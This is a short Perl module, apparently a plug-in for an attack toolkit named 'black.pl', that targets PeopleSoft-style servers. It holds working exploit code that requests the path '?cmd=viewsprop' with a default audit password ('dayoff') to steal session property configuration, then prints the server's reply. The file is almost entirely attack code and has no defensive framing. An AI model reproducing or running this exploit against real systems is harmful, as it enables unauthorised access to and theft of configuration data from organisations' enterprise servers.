#!/usr/bin/perl
# Module RFC_PING

# CONFIG
######################
my $desc ="Steal session properties config (cmd=viewsprop)\n\t Usage: black.pl .. .. -m id_module <pwd> \n\t pwd - auditPWD, default is dayoff\n"; 
our $funcName="sess_prop";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################



sub sess_prop()
{
	my $XML='1';	
	my $passwd;

		if ($ARGV[$m_arg_i+1]){
		$passwd=$ARGV[$m_arg_i+1];
		print $passwd." - password \n\n";
	} else {
		$passwd='dayoff';
	}


	my @answers=send_soap($XML,0,"/psp/$ps_site_name/?cmd=viewsprop&pwd=$passwd","GET", 2);

	my $answer=join('', @answers);
	
	print @answers;

	print "\n\n";

}


	
	
